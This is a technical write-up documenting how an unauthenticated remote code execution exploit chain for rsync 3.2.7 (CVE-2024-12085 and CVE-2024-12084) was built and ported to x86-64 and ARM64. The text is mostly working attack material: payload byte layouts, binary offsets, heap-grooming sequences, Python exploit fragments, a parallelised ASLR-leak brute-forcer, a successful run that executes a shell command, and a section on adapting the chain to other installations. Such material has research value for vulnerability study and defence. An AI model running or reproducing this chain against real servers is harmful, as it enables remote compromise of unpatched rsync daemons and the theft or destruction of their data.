# Rsync CVE-2024-12084 + CVE-2024-12085 — Unauthenticated RCE Writeup

Based on the Phrack 72 article "Desync the Planet" by Simon Scannell,
Pedro Gallegos, and Jasiel Spelman, this documents the full process of
getting the exploit chain working on our target system, including all
the debugging steps, dead ends, and system-specific adaptations.

---

## 0. Environment

### Original target (x86-64)

| Component        | Detail |
|------------------|--------|
| Target binary    | rsync 3.2.7, compiled from upstream source |
| OS               | Ubuntu 22.04.3 LTS, kernel 6.8 |
| glibc            | 2.35-0ubuntu3.13 |
| OpenSSL          | 3.0.2 |
| Arch             | x86-64 |
| Protections      | Full ASLR, PIE, NX, Full RELRO, stack canaries |
| MAX_DIGEST_LEN   | 64 (SHA512_DIGEST_LENGTH) |
| SUM_LENGTH       | 16 (fixed in `struct sum_buf`) |
| Overflow window  | 64 - 16 = **48 bytes** per sum_buf entry |

### ARM64 port target

| Component        | Detail |
|------------------|--------|
| Target binary    | rsync 3.2.7, compiled from upstream source |
| OS               | Debian 12 (bookworm), kernel 6.10.14-linuxkit (container) |
| glibc            | 2.36-9+deb12u13 |
| OpenSSL          | 3.0.18-1~deb12u2 |
| Arch             | **aarch64** |
| Protections      | Full ASLR, PIE, NX, Full RELRO, stack canaries |
| MAX_DIGEST_LEN   | 64 (identical) |
| SUM_LENGTH       | 16 (identical) |
| Debugging        | **No GDB, no strace, no root** — see §3a for substitutes |

Build note: container had `libxxhash0` runtime but no dev headers.
Worked around by fetching `xxhash.h` from upstream (v0.8.1 to match
the .so) into `/tmp/local/include` and symlinking the runtime .so as
`libxxhash.so` for the linker:

```bash
mkdir -p /tmp/local/include /tmp/local/lib
wget -O /tmp/local/include/xxhash.h \
  https://raw.githubusercontent.com/Cyan4973/xxHash/v0.8.1/xxhash.h
ln -s /usr/lib/aarch64-linux-gnu/libxxhash.so.0 /tmp/local/lib/libxxhash.so
cd /tmp/rsync-3.2.7
CPPFLAGS="-I/tmp/local/include" LDFLAGS="-L/tmp/local/lib" \
  ./configure --enable-xxhash --disable-lz4 --disable-zstd --disable-acl-support
make -j4
```

The system rsync (`3.2.7-0ubuntu0.22.04.4`) has all CVEs backported.
We built upstream 3.2.7 from source to get a vulnerable binary at
`/tmp/rsync-3.2.7/rsync`.

### Building rsync 3.2.7

```bash
cd /tmp
wget https://download.samba.org/pub/rsync/src/rsync-3.2.7.tar.gz
tar xzf rsync-3.2.7.tar.gz
cd rsync-3.2.7
./configure --with-openssl --disable-xxhash  # or --enable-xxhash
make
```

### Daemon setup

```bash
mkdir -p /tmp/rsync_test_module
echo "hello world" > /tmp/rsync_test_module/foo.txt
echo "test data"   > /tmp/rsync_test_module/bar.txt

cat > /tmp/rsyncd_test.conf << 'EOF'
log file = /tmp/rsync_daemon.log
[files]
  path = /tmp/rsync_test_module
  read only = true
  use chroot = false
EOF

/tmp/rsync-3.2.7/rsync --daemon --config=/tmp/rsyncd_test.conf --port=12000
```

Confirm vulnerability via banner:
```
$ echo "" | nc 127.0.0.1 12000
@RSYNCD: 31.0 sha512 sha256 sha1 md5 md4
```

Protocol 31 + SHA512 in the auth list confirms MAX_DIGEST_LEN = 64.

### Key binary offsets

Extract with `nm`:
```bash
nm /tmp/rsync-3.2.7/rsync | grep -E " (T|B) (shell_exec|ctx_evp|set_compression)$"
```

For our build:
```
CHECK_COMPRESSION_OFFSET = 0x436f7   # set_compression+599 (leaked via info leak)
SHELL_EXEC_OFFSET        = 0x2b970   # shell_exec() — calls system(cmd)
CTX_EVP_OFFSET           = 0x9dc28   # global EVP_MD_CTX *ctx_evp in .bss
XFER_SUM_NNI_OFFSET      = 0x89310   # SHA1 entry in valid_checksums_items
```

These change with every recompilation. You MUST extract them for your
specific binary.

---

## 1. Vulnerability Overview

### CVE-2024-12085 — Info Leak (ASLR Bypass)

In `match.c:hash_search()`, a stack buffer `sum2[MAX_DIGEST_LEN]` (64 bytes)
is only partially written by the digest algorithm. The remaining bytes contain
**uninitialized stack data**. An attacker controls `s2length` (up to 64) and
uses the server's match/no-match response as a 1-byte-at-a-time oracle to
leak up to 56 bytes of stack contents.

With xxhash64 (8-byte digest), offset `sum2+8` on the Phrack target contained
a `.text` pointer — one round of leaking gives the full PIE base.

### CVE-2024-12084 — Heap Buffer Overflow

In `sender.c:receive_sums()`, the server reads `s2length` bytes into
`sum2[16]` — overflowing by up to 48 bytes per `sum_buf` entry. By
overflowing the last entry into an adjacent `sum_struct`, the attacker
corrupts `s->sums` (WHERE to write), `s->count` (how many entries), and
`s->s2length` (how many bytes per write), creating an arbitrary
write-what-where primitive.

---

## 2. Exploitation Strategy (Phrack "One-Shot" Approach)

### High-level flow

```
┌─────────────┐    ┌─────────────────┐    ┌──────────────────┐
│  Info Leak  │───>│  Heap Overflow  │───>│  RCE Trigger     │
│  (Phase 1)  │    │  (Phase 2)      │    │                  │
│             │    │                 │    │  sum_init()      │
│  Leak .text │    │  Corrupt sums   │    │  → EVP_Digest... │
│  → PIE base │    │  → write to .bss│    │  → freectx()     │
│             │    │  → plant fake   │    │  → shell_exec()  │
│             │    │    EVP structs  │    │  → system(cmd)   │
└─────────────┘    └─────────────────┘    └──────────────────┘
```

### Phase 2 detail: one-shot .bss write

After the info leak provides the binary base, Phase 2:

1. **Heap groom**: Exhaust tcache bins, create a hole via filter rules
   so `sum_buf[5]` and `sum_struct` are adjacent on the heap.

2. **Overflow**: Send `count=5` entries with `s2length=64`. Each entry
   overflows 48 bytes. The last entry corrupts `sum_struct`:
   - `s->count` = 6 (adds one extra iteration)
   - `s->sums` = `&ctx_evp - 222` (redirects array to .bss)
   - `s->s2length` = 289 (size of our payload)

3. **Extra entry**: The 6th iteration reads `sum1` (4B) and `sum2`
   (289B) directly to `&ctx_evp`, writing:

```
Offset  Content                              .bss global
──────  ─────────────────────────────────    ──────────────────
0x000   fake_ctx_addr (ctx_evp+8)            ctx_evp (overwritten)
0x008   ┌─ fake EVP_MD_CTX (72 bytes) ─┐
        │ +0x08: digest → fake EVP_MD  │    file_sum_evp_md
        │ +0x18: flags = 0x400         │    file_sum_nni (clobbered)
        │ +0x30: xfer_sum_nni (PRESERVED)    xfer_sum_nni ← CRITICAL
        │ +0x38: algctx → cmd string   │
        └──────────────────────────────┘
0x050   ┌─ fake EVP_MD (~184 bytes) ───┐
        │ +0xb0: freectx = shell_exec  │
        └──────────────────────────────┘
0x108   "touch /tmp/rce_proof.txt\0"         sumresidue etc
```

4. **Trigger**: After `receive_sums`, the server enters `match_sums` →
   `sum_init(xfer_sum_nni, seed)` → `EVP_DigestInit_ex(ctx_evp, ...)`.
   Inside OpenSSL:
   ```
   ctx->algctx != NULL  →  ctx->digest->freectx(ctx->algctx)
                        →  shell_exec(cmd_string)
                        →  system("touch /tmp/rce_proof.txt")
   ```

### Overflow byte layout (64 bytes from last sum2)

```
Byte  Offset    Content                  Target
────  ──────    ───────                  ──────
0-15  sum2      checksum data            sum_buf[4].sum2 (in-bounds)
16-17 padding   don't care               struct padding
18-25 chunk hdr 0x31 (48B|PREV_INUSE)    sum_struct chunk size field
26-33 flength   0                        sum_struct.flength
34-41 sums      &ctx_evp - 222           sum_struct.sums (redirect)
42-45 count     6 (original + 1)         sum_struct.count
46-49 blength   1337                     sum_struct.blength
50-53 remainder 0                        sum_struct.remainder
54-57 s2length  289 (payload size)       sum_struct.s2length
58-63 padding   don't care               past sum_struct
```

---

## 3. Bugs Found and Fixed During Development

This section documents every issue encountered, how it was diagnosed,
and the fix. This is the most valuable part for anyone porting the
exploit to a new target.

### Bug 1: Protocol desync — "File-list index 49"

**Symptom**: Server logs `File-list index 49 not in -1 - 2
(read_ndx_and_attrs) [sender]`.

**Root cause (initially suspected)**: Outbound multiplexing mismatch.
We initially set `out_multiplexed = False` thinking the server didn't
demux inbound data.

**Actual root cause**: The ndx=49 error came from `read_final_goodbye`
(the SECOND ndx read), not the first. The first ndx=1 was read
correctly. The issue was that the heap overflow wasn't working, so the
server processed the file normally and then tried to read the next ndx
from leftover data in the socket.

**How diagnosed**: GDB `break flist_for_ndx` with multiple continues:
```
call 1: ndx=1           ← from send_files (correct)
call 2: ndx=49          ← from read_final_goodbye (leftover data)
```

**Key finding**: For protocol >= 30, the rsync server UNCONDITIONALLY
sets `need_messages_from_generator = 1` in `compat.c:776`, which
enables inbound demultiplexing. The client MUST send multiplexed data
(`out_multiplexed = True`). We confirmed this with GDB:
```
(gdb) break recv_filter_list
(gdb) printf "need_msgs=%d in_multiplexed=%d\n", need_messages_from_generator, iobuf.in_multiplexed
need_msgs=1 in_multiplexed=1
```

### Bug 2: Heap grooming — extra chunk in the gap

**Symptom**: `ctx_evp` watchpoint never triggered. The overflow wasn't
reaching `sum_struct`.

**Root cause**: The Phrack PoC sends TWO filters:
```go
filter := "+ " + strings.Repeat("Z", count*sumBufStructSize - 1)  // 200B pattern
client.WriteRawInt(len(filter) + 1); client.WriteLine(filter)
filter = "+ a"                                                      // tiny pattern
client.WriteRawInt(len(filter) + 1); client.WriteLine(filter)
client.WriteRawInt(len(clr) + 1); client.WriteLine(clr)  // "!" clears all
```

On Debian 12 (glibc 2.36), `malloc(2)` for pattern "a" gives an 8-byte
entry that goes to a tiny tcache bin. On Ubuntu 22.04 (glibc 2.35),
`malloc(2)` gives a **32-byte chunk** — same bin as the filter_rule
struct (48B). This extra chunk lands between `sum_buf[]` and
`sum_struct`, creating a **56-byte gap** instead of 8.

**How diagnosed**: GDB breakpoint at `sender.c:98` (after allocations):
```
With 2 filters: s=0x590 sums=0x490 diff=56   ← TOO FAR
With 1 filter:  s=0x560 sums=0x490 diff=8    ← CORRECT
```

**Fix**: Send only ONE filter (the large one). The tcache state from
the defragmentation provides the right placement without the second
filter.

```python
# WRONG (glibc 2.35):
filt = '+ ' + 'Z' * 199; rc.write_raw_int(len(filt)+1); rc.write_line(filt)
filt2 = '+ a';            rc.write_raw_int(len(filt2)+1); rc.write_line(filt2)
rc.write_raw_int(2);      rc.write_line('!')

# CORRECT (glibc 2.35):
filt = '+ ' + 'Z' * 199; rc.write_raw_int(len(filt)+1); rc.write_line(filt)
rc.write_raw_int(2);      rc.write_line('!')
```

**Verification**: `malloc_usable_size` test:
```c
malloc( 2) -> usable=24  chunk_size=32   // same bin as 32B requests
malloc(32) -> usable=40  chunk_size=48   // sum_struct lands here
malloc(40) -> usable=40  chunk_size=48   // filter_rule lands here
```

### Bug 3: xfer_sum_nni clobbered — trigger path bypassed

**Symptom**: `ctx_evp` WAS correctly overwritten (GDB watchpoint
confirmed `ctx_evp = fake_ctx_addr`). But `shell_exec` breakpoint
never hit. Server crashed with `SIGABRT: free(): invalid pointer`.

**Root cause**: Our 289-byte payload writes contiguously from `&ctx_evp`
through `&ctx_evp + 288`, overwriting ALL globals in that range. The
critical global `xfer_sum_nni` at `ctx_evp + 0x30` was zeroed.

When `match_sums` calls `sum_init(xfer_sum_nni, seed)`, it receives
`nni = NULL`. sum_init handles NULL by calling `parse_csum_name(NULL,0)`
which internally calls `malloc()`. Since the heap was corrupted by our
overflow, this malloc triggers `free(): invalid pointer` → SIGABRT.
The EVP trigger path is never reached.

**How diagnosed**: GDB break on `sum_init`:
```
sum_init(nni=0x0, seed=1337)  ← xfer_sum_nni was zeroed!
```

Then mapping the .bss layout around ctx_evp:
```bash
nm rsync | awk '/09dc/ || /09dd/'
```
```
0x09dc28 B ctx_evp              +0x000  ← we write here
0x09dc38 B xfer_sum_evp_md      +0x010
0x09dc58 B xfer_sum_nni         +0x030  ← ZEROED by our payload!
0x09dc60 b prior_result.0       +0x038
```

**Fix**: Preserve `xfer_sum_nni` in the payload at offset 0x30:
```python
XFER_SUM_NNI_OFFSET = 0x89310   # SHA1 entry in valid_checksums_items
xfer_sum_nni = base + XFER_SUM_NNI_OFFSET
struct.pack_into('<Q', payload, 0x30, xfer_sum_nni)
```

The SHA1 NNI entry is at a fixed offset in the binary's `.data` section,
so we can compute its runtime address from the leaked base.

### Bug 4: Chunk metadata corruption

**Symptom (earlier)**: Server crash during `receive_sums` loop when
overflow bytes 18-25 were all zeros, corrupting the malloc chunk size
field between `sum_buf[]` and `sum_struct`.

**Fix**: Set bytes 18-25 to `0x31` (48-byte chunk | PREV_INUSE):
```python
struct.pack_into('<Q', overflow_payload, 18, 0x31)
```

This is the correct chunk size for `sum_struct` (`malloc(32)` → 48B
chunk on glibc 2.35).

---

## 3a. ARM64 Port (Debian 12 / glibc 2.36 / OpenSSL 3.0.18)

The exploit was successfully ported to arm64. Five issues were found
that did NOT affect the x86-64 build, all diagnosed without GDB (using
LD_PRELOAD probes and a 200-line ptrace crash-catcher).

### Summary of arm64 changes

| Item | x86-64 (original) | arm64 | Discovered via |
|------|-------------------|-------|----------------|
| Leak target | `set_compression+599` at `sum2[8:16]` | `start_server+0x484` at `sum2[24:32]` | LD_PRELOAD memcmp hook |
| Leak bytes | 8 | 24 | Same |
| Leak `count` | 3277 | **1** | Stability probe across N connections |
| `xfer_sum_nni` | `ctx_evp+0x30` | `ctx_evp+0x90` | `nm \| sort` near ctx_evp |
| Command string | `ctx_evp+0x108` | `ctx_evp+0x58` | ptrace crash catcher + match_sums disasm |
| `fake_evp_md` | `ctx_evp+0x50` | `ctx_evp+0xa0` | Cascaded from above |
| Heap filters | 1 (glibc 2.35) | 1 | malloc_usable_size test |
| EVP_MD_CTX layout | — | identical | libcrypto disassembly |

### Bug A1: Info-leak target at sum2+24, not sum2+8

ARM64's calling convention spills LR (x30) at a different stack offset
than x86-64's return address. An LD_PRELOAD `memcmp` hook captured the
sum2 buffer at the moment of comparison:

```
memcmp(s1=sum2, s2=..., n=16) from rsync+0x2d60c
  sum2+ 0: fabaa6f38f5d7a62  ← xxh64 (the 8 valid bytes)
  sum2+ 8: 0000aaaa00000000  ← partial address (high 16 bits only)
  sum2+16: 0000ffffefb3cbe0  ← stack pointer
  sum2+24: 0000aaaac552aec4  ← *** rsync .text ptr! ***
  sum2+32: 0000000000000005
```

The pointer at +24 is `start_server+0x484` — the LR saved by
`send_files`'s prologue, pointing to the instruction right after
`bl send_files` in `start_server`. This is 100% stable across forked
children of one daemon (same address space).

**Fix**: leak 24 bytes instead of 8; extract pointer from `s2[24:32]`.

```python
LEAK_OFFSET = 0x2aec4   # start_server+0x484 (objdump: instruction after bl send_files)
LEAK_BYTES  = 24
...
ptr = struct.unpack('<Q', s2[8+LEAK_BYTES-8:8+LEAK_BYTES])[0]
```

### Bug A2: count=3277 destabilizes the stack — must use count=1

The full leak hung at byte 19. Bytes 16-18 were found, byte 19 returned
no match across 256 guesses × 3 attempts.

**Root cause**: with `count=3277`, `build_hash_table()` (called from
`hash_search`) computes `tablesize` from `count` and allocates a hash
table whose size depends on the number of entries. The allocation
itself doesn't move the stack, but the *first* call sets a static
`alloc_size` which causes a `realloc()` on subsequent calls when the
size differs. The varying call sequence between the byte-19 connection
and earlier connections (which used progressively longer s2 buffers)
causes a one-page shift in the buffer state propagated through io.c's
buffering, landing a different value at `sum2[19]`.

**How diagnosed**: a per-connection memcmp probe with `count=1` showed
all 32 bytes of sum2 are byte-for-byte identical across 5 consecutive
connections:

```
[17029] sum2: ...|00000000aaaa0000|a01e6bcbffff0000|c4ae5bacaaaa0000
[17031] sum2: ...|00000000aaaa0000|a01e6bcbffff0000|c4ae5bacaaaa0000
[17033] sum2: ...|00000000aaaa0000|a01e6bcbffff0000|c4ae5bacaaaa0000
```

With `count=3277`, byte 19 (`sum2[19]`) varied. With `count=1`, the
hash table is always the same size and the stack is stable.

The original exploit used 3277 entries to maximize the chance that
hash_search checks our entry — but with a single entry whose `sum1`
is correct, the hash table has exactly one bucket and it always
matches on the first iteration. **count=1 is both necessary and
sufficient.**

```python
# WRONG: perturbs stack
rc.write_raw_int(3277); ...; rc.write_bulk((sum1+ov) * 3277)
# CORRECT:
rc.write_raw_int(1);    ...; rc.write_bulk(sum1 + ov)
```

### Bug A3: Command string truncated by match_sums init

`shell_exec` was confirmed hit (via ptrace breakpoint) with
`X0 = ctx_evp+0x108` and a fork was observed — but the proof file
never appeared. The crash dump showed the command at +0x108 read as
`"touch /t"` followed by zeros.

**Root cause**: at the very top of `match_sums` (before `sum_init`),
the disassembly shows:

```asm
2d10c: str xzr, [x2, #192]   ; last_match = 0      → ctx_evp+0x110 (8 bytes)
2d110: str xzr, [x4, #8]     ; data_transfer = 0   → ctx_evp+0x118 (8 bytes)
2d114: stp wzr, wzr, [x4,#16]; false_alarms,hash_hits → +0x120 (8 bytes)
2d118: str wzr, [x4, #24]    ; matches = 0         → ctx_evp+0x128 (4 bytes)
2d120: bl sum_init
```

The `last_match` global lives at `ctx_evp+0x110` on the arm64 build.
Our command at `+0x108` had bytes 0-7 (`"touch /t"`) safe, but bytes
8+ (`"mp/RCE_OK\0"`) at `+0x110..` were zeroed before `sum_init` ran.
`system("touch /t")` then tried to create `/t` and silently failed.

On the x86-64 build these globals were at higher offsets (past the
payload end) so this never triggered.

**Fix**: relocate the command to `+0x58`, inside the `ctx_md` static
struct (an 88-byte `md_context` union spanning `+0x20..+0x77`). This
struct is only touched by the builtin MD4/MD5 paths, never by the
OpenSSL EVP path. Cascaded effect: `fake_evp_md` moves to `+0xa0`
(just past the `+0x90` `xfer_sum_nni` preserve), and `freectx` to
`+0x150`. Total payload: 344 bytes.

```
ARM64 payload layout (offsets from &ctx_evp):
  0x000  ctx_evp value → fake_ctx (+8)
  0x008  fake EVP_MD_CTX (72B)
           +0x08 digest → +0xa0   (was → +0x50)
           +0x18 flags = 0x400
           +0x28 pctx  = NULL
           +0x38 algctx → +0x58   (was → +0x108)
  0x058  command string + null   (max 56 bytes; safe inside ctx_md)
  0x090  xfer_sum_nni  ← PRESERVED (was at +0x30 on x86-64)
  0x0a0  fake EVP_MD
           +0xb0 freectx = shell_exec  (absolute: +0x150)
  0x158  end of payload
```

Globals overwritten by sum_init/match_sums BEFORE the trigger fires:
  +0x08  cur_sum_nni     ← sum_init writes nni     (= fake_ctx[0], harmless)
  +0xe0  cur_sum_len     ← sum_init writes 20      (= fake_evp_md[0x40], read-after-trigger)
  +0xe8  cur_sum_evp_md  ← sum_init writes EVP_MD* (= fake_evp_md[0x48], unused)
  +0x110 last_match      ← match_sums zeroes       (now past payload end)

### Bug A4: arm64 glibc 2.36 still needs ONE filter

The original writeup says Debian 12 (glibc 2.36) gives `malloc(2)` an
8-byte chunk and needs the two-filter approach. **This is wrong on
arm64** — `malloc(2)` gives a 32-byte chunk identical to glibc 2.35:

```
$ gcc malloc_test.c && ./a.out
malloc( 2) -> usable=24 chunk=32   # arm64 glibc 2.36
malloc(32) -> usable=40 chunk=48
malloc(48) -> usable=56 chunk=64
```

The arm64 glibc has a 16-byte minimum chunk size (vs. 8 on some x86-64
builds) due to `MALLOC_ALIGNMENT = 2*sizeof(size_t) = 16`. The second
`"+ a"` filter creates an extra 32-byte chunk in the gap, so the
**one-filter** approach is correct here too. Confirmed empirically:
two filters → "File-list index 185" (gap too large), one filter → RCE.

### Bug A5: rsync_lib.py protocol details (found via socat wire capture)

Building the protocol library from scratch surfaced five details that
the rsync source doesn't make obvious:

1. **Daemon args use `\0` terminators, not `\n`.** A capture of the
   real client showed `--server\0--sender\0-rce.LsfxCIvu\0...\0\0`.
   Module name and greeting use `\n`, args use `\0`.

2. **Checksum negotiation: both sides write before reading.**
   `negotiate_the_strings` calls `send_negotiate_str` then
   `recv_negotiate_str` on BOTH sides. Order on the wire:
   compat_flags (S→C), client csum vstring (C→S), server csum vstring
   (S→C), checksum_seed (S→C). All on the raw socket — multiplexing
   only starts after.

3. **`write_line` must respect the multiplex state.** Filters are
   sent via `write_line` AFTER `io_start_multiplex_in` runs on the
   server. A `write_line` that always uses raw socket sends `"+ ZZZ..."`
   without a MSG_DATA frame, which the server reads as a multiplex
   header → `unexpected tag 83` (`'Z' - MPLEX_BASE`).

4. **`get_checksum1` uses signed char and `CHAR_OFFSET=0`.** The
   "adler32" name is misleading — it's a custom rolling sum that casts
   to `schar` (signed). On arm64 where `char` is unsigned by default,
   the cast matters for any byte ≥ 0x80. Wrong → s1 mismatch → no
   `get_checksum2` call → no leak.

5. **File list is sorted server-side after sending.** The wire order
   is directory-walk order; the ndx the client sends back references
   `flist_sort_and_clean`'s output (≈ `strcmp` on path).

### Working without GDB

This port was done in a container with no `gdb`, no `strace`, no root.
Tools that filled the gap:

- **LD_PRELOAD memcmp hook**: dumps the `sum2` buffer (first arg) on
  every call from `match_sums`'s address range. `__builtin_return_address(0)`
  + `/proc/self/maps` → caller offset. Found the leak target in one shot.

- **ptrace crash catcher** (200 LOC): `PTRACE_ATTACH` to the rsync
  child after the overflow is sent but before the trigger fires.
  Catches `SIGSEGV`, dumps `PC`/`LR`/`X0..X3`, then peeks the entire
  payload region from `/proc/PID/mem`. The crash `LR` mapped to
  libcrypto's `digest->cleanup` indirect call, proving `freectx` had
  already returned — i.e. `shell_exec` ran but the command was broken.

- **ptrace breakpoint on shell_exec**: poked `BRK #0` (`0xd4200000`)
  at the function entry, caught the trap, read `X0` (cmd pointer), then
  followed `PTRACE_O_TRACEFORK` to confirm `system()`'s fork happened.
  This proved the command pointer was correct but the *string* was
  truncated at byte 8.

- **Pattern-payload memory survival test**: filled the entire payload
  with `0xCAFE000000000000 | offset`, let it crash on first deref,
  dumped the region. Every 8-byte slot that survived showed its own
  offset; clobbered slots showed something else. This proved `+0x40`
  survives until OpenSSL — the zeroing was *inside* `EVP_DigestInit_ex`
  (after `freectx` returned), not before.

### Speeding up the 24-byte leak

The naive leak is slow: 24 bytes × ~128 tries average × ~120ms per
connection ≈ 6 minutes. Two stacked optimizations bring this to ~14s.

**1. Hint table — 18 of 24 bytes are structural constants.**

arm64 user-space addresses follow a fixed pattern: top 16 bits are
zero (canonical), the next 16 bits identify the region (`0xaaaa` for
ELF mappings, `0xffff` for the stack). The page-offset bits of the
leaked pointer equal the page-offset bits of `LEAK_OFFSET` (since the
binary base is page-aligned). Encode this knowledge:

```python
hints = {
    8: [0x00], 9: [0x00], 10: [0x00], 11: [0x00],   # canonical zeros
    12: [0xaa], 13: [0xaa], 14: [0x00], 15: [0x00], # binary high bytes
    20: [0xff], 21: [0xff], 22: [0x00], 23: [0x00], # stack high bytes
    24: [LEAK_OFFSET & 0xff],                       # page offset (exact)
    25: [(LEAK_OFFSET >> 8) & 0xff],                # next byte (exact: base bits 12-15 are 0)
    28: [0xaa], 29: [0xaa], 30: [0x00], 31: [0x00], # binary high bytes
}
```

Hinted bytes hit on the first connection. The ASLR'd middle bytes
(stack pointer bits 0-31, binary base bits 16-31) are the only ones
that need real brute force — about 6 bytes.

This is robust: `0xab` instead of `0xaa` at byte 12 is possible
(binary loaded above `0xaaab_00000000`), but the hint just costs one
extra connection before falling through to the search. The sample run
below shows exactly that case.

**2. Parallel fan-out for the random bytes.**

Each connection is independent and I/O-bound. For bytes with no hint,
dispatch all 256 candidates concurrently and take the first hit:

```python
pool = ThreadPoolExecutor(max_workers=16)
futures = {pool.submit(probe, prefix, b): b for b in remaining}
for fut in as_completed(futures):
    if fut.result() is not None:
        for f in futures: f.cancel()  # best-effort
        break
```

The connection *count* goes up (in-flight probes finish even after a
hit) but wall-clock drops ~10×. The daemon happily forks 16 children
in parallel; each runs independently.

### Successful arm64 run (optimized)

```
$ /tmp/rsync-3.2.7/rsync --daemon --config=/tmp/rsyncd_test.conf --port=12000 --address=127.0.0.1
node@acbc495cee13:/workspace$ time python3 exploit.py "rsync://127.0.0.1:12000/files" "id > /tmp/rce_proof.txt"
[*] Phase 1: info leak  |  file=bar.txt size=15
    sum2[8] = 0x00  (1 total connections)
    sum2[9] = 0x00  (2 total connections)
    sum2[10] = 0x00  (3 total connections)
    sum2[11] = 0x00  (4 total connections)
    sum2[12] = 0xab  (260 total connections)         ← hint 0xaa missed; fell through to search
    sum2[13] = 0xaa  (261 total connections)
    sum2[14] = 0x00  (262 total connections)
    sum2[15] = 0x00  (263 total connections)
    sum2[16] = 0x00  (519 total connections)         ← stack ptr, ASLR'd
    sum2[17] = 0x7a  (775 total connections)
    sum2[18] = 0xde  (1031 total connections)
    sum2[19] = 0xee  (1287 total connections)
    sum2[20] = 0xff  (1288 total connections)
    sum2[21] = 0xff  (1289 total connections)
    sum2[22] = 0x00  (1290 total connections)
    sum2[23] = 0x00  (1291 total connections)
    sum2[24] = 0xc4  (1292 total connections)        ← LEAK_OFFSET low byte, exact
    sum2[25] = 0xae  (1293 total connections)
    sum2[26] = 0xdc  (1549 total connections)        ← base bits 16-23, ASLR'd
    sum2[27] = 0xd2  (1805 total connections)
    sum2[28] = 0xaa  (1806 total connections)
    sum2[29] = 0xaa  (1807 total connections)
    sum2[30] = 0x00  (1808 total connections)
    sum2[31] = 0x00  (1809 total connections)
[+] Leaked .text ptr : 0xaaaad2dcaec4
[+] Binary base      : 0xaaaad2da0000

[*] Phase 2: heap overflow → RCE
    shell_exec = 0xaaaad2dca120
    ctx_evp    = 0xaaaad2e54fb0
    payload    = 344 bytes at &ctx_evp
    fake_ctx   = 0xaaaad2e54fb8 (+8)
    fake_evpmd = 0xaaaad2e55050 (+160)
    cmd_addr   = 0xaaaad2e55008 (+88)
    target ndx=1 file=bar.txt
    sending payload (344 bytes) to &ctx_evp...
    overflow complete, consuming server output...
    server connection ended: connection closed
[+] Payload delivered — check if command executed.

real    0m14.383s
user    0m0.674s
sys     0m1.609s

$ cat /tmp/rce_proof.txt
uid=1000(node) gid=1000(node) groups=1000(node)
```

1809 connections in 14 seconds — ~125 connections/second sustained.
17 of 24 bytes were one-shot hint hits; the 7 searched bytes consumed
~256 connections each (full fan-out, since `as_completed` doesn't
preempt running probes). Phase 2 is a single connection.

---

## 4. Porting to Other Installations

### What changes between targets

| Item | Why it changes | How to find it |
|------|---------------|----------------|
| `SHELL_EXEC_OFFSET` | Different compiler/flags | `nm rsync \| grep shell_exec` |
| `CTX_EVP_OFFSET` | Different .bss layout | `nm rsync \| grep ctx_evp` |
| `CHECK_COMPRESSION_OFFSET` | Different .text layout | `nm rsync \| grep set_compression` then add 599 |
| `XFER_SUM_NNI_OFFSET` | Different .data layout | `nm rsync \| grep valid_checksums_items`, then GDB to find SHA1 entry |
| Heap grooming | Different glibc version | See below |
| OpenSSL struct offsets | Different OpenSSL version | Reverse-engineer EVP_MD_CTX/EVP_MD layouts |
| .bss neighbor globals | Different compiler | `nm rsync \| sort` near ctx_evp |

### Adapting heap grooming for a new glibc

The #1 portability issue is heap grooming. The exploit needs `sum_struct`
allocated immediately after `sum_buf[]` with only an 8-byte chunk header
between them.

**Step 1**: Check malloc chunk sizes:
```c
// Compile and run on target:
#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
int main() {
    for (int sz = 1; sz <= 48; sz++) {
        void *p = malloc(sz);
        printf("malloc(%2d) -> usable=%zu chunk=%zu\n",
               sz, malloc_usable_size(p), malloc_usable_size(p)+8);
        free(p);
    }
}
```

**Step 2**: Set breakpoint at `sender.c:98` and check the gap:
```
(gdb) break sender.c:98
(gdb) continue
(gdb) printf "s=%p sums=%p diff=%ld\n", s, s->sums, (long)s - ((long)s->sums + s->count*40)
```

If `diff = 8` → grooming is correct.
If `diff > 8` → extra chunks in the gap. Try:
  - Removing the second filter
  - Adjusting filter pattern sizes
  - Adding more filter rules to consume extra tcache entries

**Step 3**: Check which .bss globals the payload overwrites:
```bash
nm rsync | sort | awk -v base=$(nm rsync | grep ' B ctx_evp$' | cut -d' ' -f1) \
  '{ a=strtonum("0x"$1); b=strtonum("0x"base); if (a>=b && a<b+300) print }'
```

Any global between `ctx_evp` and `ctx_evp+289` that is read during the
trigger path must be preserved in the payload. On our target,
`xfer_sum_nni` at `+0x30` was the critical one.

### Adapting for different OpenSSL versions

The trigger relies on OpenSSL's `EVP_DigestInit_ex` calling
`ctx->digest->freectx(ctx->algctx)`. This cleanup path exists in
OpenSSL 3.x when reinitializing a context that already has an `algctx`.

For OpenSSL 1.1.x, the struct layout and cleanup path differ. You'll
need to reverse-engineer `EVP_DigestInit_ex` in the target's
`libcrypto.so` to find:
- The offset of `digest` in `EVP_MD_CTX`
- The offset of `algctx` in `EVP_MD_CTX`
- The offset of `freectx` in `EVP_MD`
- What conditions trigger the cleanup (flags, etc.)

### Adapting for non-SHA1 checksums

If the target server supports xxhash (most stock packages do), Phase 1
uses xxhash64 (8-byte digest) for a faster and more reliable info leak.
If only SHA1/MD5 are available, the info leak window starts at offset 20
instead of 8, requiring binary-specific analysis to locate a pointer
in that range.

Phase 2 uses SHA1 as the checksum for the overflow connection. The
`XFER_SUM_NNI_OFFSET` must point to whichever checksum entry is
negotiated. Use GDB to verify:
```
(gdb) break sender.c:98
(gdb) printf "xfer_sum_nni->name=%s offset=0x%lx\n", xfer_sum_nni->name, (long)xfer_sum_nni - base
```

---

## 5. Debugging Methodology

### Essential GDB techniques

**Attach to daemon with fork following**:
```bash
DPID=$(pgrep -x rsync)
gdb -q -p $DPID \
  -ex "set follow-fork-mode child" \
  -ex "set detach-on-fork off" \
  -ex "set pagination off"
```

Ensure `ptrace_scope` allows attaching:
```bash
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```

**Key breakpoints**:
```
break sender.c:98          # after sum_buf + sum_struct allocated
break shell_exec           # RCE trigger
watch *(long*)&ctx_evp     # detect ctx_evp overwrite
break sum_init             # check nni argument
break flist_for_ndx        # track ndx values
```

**Check heap layout**:
```
(gdb) break sender.c:98
(gdb) printf "s=%p sums=%p gap=%ld\n", s, s->sums, (long)s - ((long)s->sums + 200)
(gdb) x/16gx (char*)s->sums + 200 - 8
```

**Check .bss state after overflow**:
```
(gdb) watch *(long*)&ctx_evp
(gdb) continue
# When hit:
(gdb) x/40gx &ctx_evp
(gdb) printf "xfer_sum_nni=%p\n", xfer_sum_nni
```

